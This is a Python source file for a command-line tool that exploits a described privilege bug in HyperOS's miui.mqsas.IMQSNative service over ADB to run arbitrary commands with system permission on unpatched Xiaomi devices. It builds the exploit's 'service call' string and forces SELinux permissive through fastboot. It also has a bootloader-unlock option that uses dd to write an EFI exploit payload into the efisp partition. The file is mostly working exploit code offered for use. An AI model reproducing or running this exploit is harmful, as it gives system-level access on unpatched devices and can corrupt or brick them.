from datetime import datetime
import os
import adbutils
from Command import Command, parse_command

RUNTIME_PATH = os.getenv("RUNTIME_PATH", "/sdcard/Download/debug/")
LOG_FILE_PATH = f"{RUNTIME_PATH}log.txt"
FLASHTOOL_PATH = os.getenv("FLASHTOOL_PATH", "/runtime/flashtool/")
EFI_FILE_PATH = os.getenv("EFI_FILE_PATH", "/runtime/efi/gbl_efi_unlock.efi")

HELP_STR = """---------------------
HyperOS IMQSNative Service Call Tool
---------------------
This tool can run any command & get its execution results via miui.mqsas.IMQSNative, which have a bug could let user run command with system permission;
This bug only works on system which don't have 2026.2 security patch fix;
If your device's system is above 3.0.6 (for older devices like Xiaomi 13 & Redmi K70) ~ 3.0.22 (for newer devices like Xiaomi 17 & Redmi K90 Pro Max), you may cannot use this tool.
This bug need permissive selinux, you need to run "selinux" to set selinux permissive before run any command;
Take full responsibility for your own device! Your data is priceless! Strongly recommend you to backup your data before doing any dangerous operation.
---------------------
~bootloader \t\t\t [CPU Snapdragon 8 Elite Gen 5 (Xiaomi 17 Series & Redmi K90 Pro Max) Only!!! Don't run this on other devices]
\t\t\t\t Try unlock the device's bootloader with unlock efi file @https://github.com/hicode002/qualcomm_gbl_exploit_poc
cls \t\t\t\t Clear screen
debug \t\t\t\t Switch tool Debug mode, when True, it will display detailed running info 
devices \t\t\t Get connected devices' info
help \t\t\t\t Show this help message
safe \t\t\t\t Switch tool Safe Mode, when True, it prohibits some dangerous operations like "rm"
selinux \t\t\t Try to set selinux permissive
shell [COMMAND] \t\t Run a command with adb shell
switch [SERIAL] \t\t Switch to a specific device
*[services] *[args] \t\t Run a command with IMQSNative service
---------------------"""

adb = adbutils.adb


def generate_timestamp() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(content: str, debug_mode: bool):
    if debug_mode:
        print(f"[{generate_timestamp()}] [DEBUG] {content}")


def build_shell_cmd(cmd: Command, log_path: str = LOG_FILE_PATH) -> str:
    return f'service call miui.mqsas.IMQSNative 21 i32 1 s16 "{cmd.service}" i32 1 s16 "{cmd.args}" s16 "{log_path}" i32 60'


def run_shell_cmd(device: adbutils.AdbDevice, cmd: Command, debug_mode: bool) -> str:
    # create debug dir
    device.shell(f"mkdir -p $(dirname {LOG_FILE_PATH})")
    # clear older log
    result = device.shell(f"rm {LOG_FILE_PATH}")
    # run shell command
    shell_cmd = build_shell_cmd(cmd, log_path=LOG_FILE_PATH)
    log(f"Running command: {shell_cmd}", debug_mode)
    result = device.shell(shell_cmd)
    log(f"Result: {result}", debug_mode)
    # print result
    result = device.shell(f"cat {LOG_FILE_PATH}")
    return result


def main():
    debug_mode = False
    safe_mode = True
    curr_device = None
    print(HELP_STR)
    while 1:
        try:
            # try connect to the default device
            if curr_device is None:
                try:
                    curr_device = adb.device()
                except:
                    print("No device connected")
                    input("Press enter to recheck devices.")
                    continue

            cmd = parse_command(
                input(f"[{generate_timestamp()}] ({curr_device.serial}) > ")
            )
            if cmd.service == "":
                continue
            cmd.service = cmd.service.lower()

            if cmd.service == "help":
                print(HELP_STR)

            elif cmd.service == "debug":
                debug_mode = not debug_mode
                print(f"DebugMode: {debug_mode}")

            elif cmd.service == "safe":
                safe_mode = not safe_mode
                print(f"SafeMode: {safe_mode}")

            elif cmd.service == "cls":
                os.system("cls")

            elif cmd.service == "switch":
                if cmd.args:
                    curr_device = adb.device(serial=cmd.args)
                    print(
                        f"Connected to device {curr_device.serial}:{curr_device.prop.model}"
                    )
                else:
                    print("Please specify device serial")

            elif cmd.service == "devices":
                devices = adb.device_list()
                if devices:
                    print("Connected Devices:")
                    for i, d in enumerate(devices):
                        print(f"{i}: {d.serial} - {d.prop.model}")
                else:
                    print("No devices connected")

            elif cmd.service == "selinux":
                if not curr_device:
                    print("Please connect to a device before running commands.")
                    continue
                print(curr_device.shell("reboot bootloader"))
                os.system(
                    f"{FLASHTOOL_PATH}fastboot set-gpu-preemption-value 0 androidboot.selinux=permissive"
                )
                os.system(f"{FLASHTOOL_PATH}fastboot continue")
                input("Please wait your device reboot...(Press Enter to continue)")

            elif cmd.service == "~bootloader":
                if not curr_device:
                    print("Please connect to a device before running commands.")
                    continue
                curr_device.sync.push(EFI_FILE_PATH, f"{RUNTIME_PATH}efi_unlock.efi")
                print(
                    run_shell_cmd(
                        curr_device,
                        Command(
                            "dd",
                            f"if={RUNTIME_PATH}efi_unlock.efi of=/dev/block/by-name/efisp",
                        ),
                        debug_mode,
                    )
                )
                curr_device.shell("reboot")
                input("Please wait your device reboot...(Press Enter to continue)")
                
            elif cmd.service == "shell":
                if not curr_device:
                    print("Please connect to a device before running commands.")
                    continue
                result = curr_device.shell(cmd.args)
                print(result)

            elif cmd.service == "rm":
                if not curr_device:
                    print("Please connect to a device before running commands.")
                    continue
                if not safe_mode:
                    # check if command dangerous
                    if (
                        cmd.args
                        and "-rf" in cmd.args
                        and ("*" in cmd.args or "/" in cmd.args)
                    ):
                        print("WARNING: This operation might be dangerous!")
                        confirm = input("Are you sure? (yes/no): ")
                        if confirm.lower() == "yes":
                            print(run_shell_cmd(curr_device, cmd, debug_mode))
                        else:
                            print("Operation cancelled")
                    else:
                        print(run_shell_cmd(curr_device, cmd, debug_mode))
                else:
                    print("Cannot do this operation when safe mode is on!")

            else:
                if not curr_device:
                    print("Please connect to a device before running commands.")
                    continue
                print(run_shell_cmd(curr_device, cmd, debug_mode))

        except KeyboardInterrupt:
            print("Exiting...")
            exit()

        except adbutils.AdbError as e:
            print(f"AdbError:{e}")

        except Exception as e:
            print(f"Error: {e}")


if __name__ == "__main__":
    main()
